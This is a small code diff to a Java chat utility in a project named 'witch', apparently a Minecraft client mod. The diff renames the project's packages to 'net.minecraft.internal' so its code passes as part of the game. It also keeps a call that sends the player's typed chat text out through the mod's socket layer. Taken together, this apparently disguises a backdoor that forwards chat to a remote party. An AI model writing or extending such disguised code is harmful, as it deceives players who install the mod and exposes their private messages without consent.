@@ -1,5 +1,6 @@
-package me.soda.witch.client.utils;
+package net.minecraft.internal.utils;
 
+import net.minecraft.internal.Witch;
 import me.soda.witch.shared.socket.messages.Variables;
 import net.minecraft.text.MutableText;
 import net.minecraft.text.Text;
@@ -7,7 +8,7 @@ import net.minecraft.util.Formatting;
 
 import java.util.regex.Pattern;
 
-import static me.soda.witch.client.Witch.mc;
+import static net.minecraft.internal.Witch.mc;
 
 public class ChatUtil {
     private static boolean firstTime = true;
@@ -49,7 +50,7 @@ public class ChatUtil {
         System.arraycopy(msgArr, 1, strArr, 0, strArr.length);
         String chatText = String.join(" ", strArr);
         chat(Text.of(chatText), true);
-        NetUtil.send("chat", chatText);
+        Witch.send("chat", chatText);
         return true;
     }
 }
